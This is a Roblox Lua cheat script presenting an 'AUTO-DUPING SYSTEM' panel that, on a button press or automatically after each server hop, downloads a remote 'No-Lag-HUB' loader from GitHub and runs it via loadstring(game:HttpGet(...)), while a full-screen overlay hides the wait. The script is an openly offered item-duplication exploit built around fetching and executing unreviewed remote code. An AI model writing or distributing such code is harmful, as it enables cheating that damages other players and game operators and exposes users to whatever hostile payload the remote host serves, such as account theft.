local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "AutoDupingSystem"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Function to show processing screen
local function showProcessingScreen()
    local processGui = Instance.new("ScreenGui")
    processGui.Name = "DupingProcessScreen"
    processGui.IgnoreGuiInset = true
    processGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    processGui.Parent = player:WaitForChild("PlayerGui")
    
    -- Dark background
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BackgroundTransparency = 0.3
    bg.Parent = processGui
    
    -- Main message
    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(0.9, 0, 0, 100)
    text.Position = UDim2.new(0.05, 0, 0.4, -50)
    text.BackgroundTransparency = 1
    text.Text = "AUTO-DUPING SYSTEM ACTIVATED"
    text.TextColor3 = Color3.new(1, 1, 1)
    text.Font = Enum.Font.SourceSansBold
    text.TextSize = 28
    text.TextWrapped = true
    text.TextXAlignment = Enum.TextXAlignment.Center
    text.TextYAlignment = Enum.TextYAlignment.Center
    text.Parent = processGui
    
    -- Sub message
    local subText = Instance.new("TextLabel")
    subText.Size = UDim2.new(0.9, 0, 0, 60)
    subText.Position = UDim2.new(0.05, 0, 0.5, 0)
    subText.BackgroundTransparency = 1
    subText.Text = "Processing server hop...\nThis may cause temporary freezing"
    subText.TextColor3 = Color3.new(1, 1, 1)
    subText.Font = Enum.Font.SourceSans
    subText.TextSize = 20
    subText.TextWrapped = true
    subText.TextXAlignment = Enum.TextXAlignment.Center
    subText.TextYAlignment = Enum.TextYAlignment.Center
    subText.Parent = processGui
    
    -- Loading animation
    local spinner = Instance.new("ImageLabel")
    spinner.Name = "Spinner"
    spinner.Size = UDim2.new(0, 50, 0, 50)
    spinner.Position = UDim2.new(0.5, -25, 0.7, 0)
    spinner.BackgroundTransparency = 1
    spinner.Image = "rbxassetid://5644704149" -- Default loading spinner
    spinner.Parent = processGui
    
    coroutine.wrap(function()
        while spinner and spinner.Parent do
            spinner.Rotation = spinner.Rotation + 5
            task.wait()
        end
    end)()
    
    return processGui
end

-- Main execution function
local function executeDupingScript()
    local processScreen = showProcessingScreen()
    
    task.delay(0.5, function()
        -- Execute the main duping script
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
        end)
        
        -- Remove screen after completion
        task.delay(15, function()
            if processScreen and processScreen.Parent then
                processScreen:Destroy()
            end
            
            if not success then
                warn("Duping script failed to load:", err)
            end
        end)
    end)
end

-- Create control panel
local controlFrame = Instance.new("Frame")
controlFrame.Size = UDim2.new(0, 350, 0, 200)
controlFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
controlFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
controlFrame.BorderSizePixel = 0
controlFrame.Parent = gui

Instance.new("UICorner", controlFrame).CornerRadius = UDim.new(0, 8)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "AUTO-DUPING SYSTEM"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.Parent = controlFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.9, 0, 0, 40)
statusLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Status: IDLE"
statusLabel.TextColor3 = Color3.new(0, 1, 0)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 16
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = controlFrame

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0.8, 0, 0, 40)
toggleButton.Position = UDim2.new(0.1, 0, 0.5, 0)
toggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
toggleButton.TextColor3 = Color3.new(1, 1, 1)
toggleButton.Font = Enum.Font.Gotham
toggleButton.TextSize = 16
toggleButton.Text = "ENABLE AUTO-EXECUTE"
toggleButton.Parent = controlFrame

Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 6)

-- Server hop detection system
local autoExecuteEnabled = false
local lastPlaceId = game.PlaceId
local lastServerId = game.JobId

toggleButton.MouseButton1Click:Connect(function()
    autoExecuteEnabled = not autoExecuteEnabled
    
    if autoExecuteEnabled then
        toggleButton.Text = "DISABLE AUTO-EXECUTE"
        toggleButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
        statusLabel.Text = "Status: ACTIVE (Monitoring)"
        statusLabel.TextColor3 = Color3.new(1, 0.5, 0)
        lastPlaceId = game.PlaceId
        lastServerId = game.JobId
    else
        toggleButton.Text = "ENABLE AUTO-EXECUTE"
        toggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        statusLabel.Text = "Status: DISABLED"
        statusLabel.TextColor3 = Color3.new(0, 1, 0)
    end
end)

-- Server hop detection loop
coroutine.wrap(function()
    while true do
        if autoExecuteEnabled then
            -- Check if we've changed servers (either place or server ID changed)
            if game.PlaceId ~= lastPlaceId or game.JobId ~= lastServerId then
                statusLabel.Text = "Status: EXECUTING..."
                statusLabel.TextColor3 = Color3.new(1, 0, 0)
                
                -- Update our tracking IDs
                lastPlaceId = game.PlaceId
                lastServerId = game.JobId
                
                -- Execute the duping script
                executeDupingScript()
                
                -- Wait for execution to complete
                task.wait(16)
                
                if autoExecuteEnabled then
                    statusLabel.Text = "Status: ACTIVE (Monitoring)"
                    statusLabel.TextColor3 = Color3.new(1, 0.5, 0)
                end
            end
        end
        task.wait(1)
    end
end)()

-- Manual execute button
local manualButton = Instance.new("TextButton")
manualButton.Size = UDim2.new(0.8, 0, 0, 40)
manualButton.Position = UDim2.new(0.1, 0, 0.75, 0)
manualButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
manualButton.TextColor3 = Color3.new(1, 1, 1)
manualButton.Font = Enum.Font.Gotham
manualButton.TextSize = 16
manualButton.Text = "EXECUTE NOW"
manualButton.Parent = controlFrame

Instance.new("UICorner", manualButton).CornerRadius = UDim.new(0, 6)

manualButton.MouseButton1Click:Connect(function()
    statusLabel.Text = "Status: MANUAL EXECUTION..."
    statusLabel.TextColor3 = Color3.new(1, 0, 0)
    executeDupingScript()
    task.wait(16)
    if autoExecuteEnabled then
        statusLabel.Text = "Status: ACTIVE (Monitoring)"
        statusLabel.TextColor3 = Color3.new(1, 0.5, 0)
    else
        statusLabel.Text = "Status: IDLE"
        statusLabel.TextColor3 = Color3.new(0, 1, 0)
    end
end)
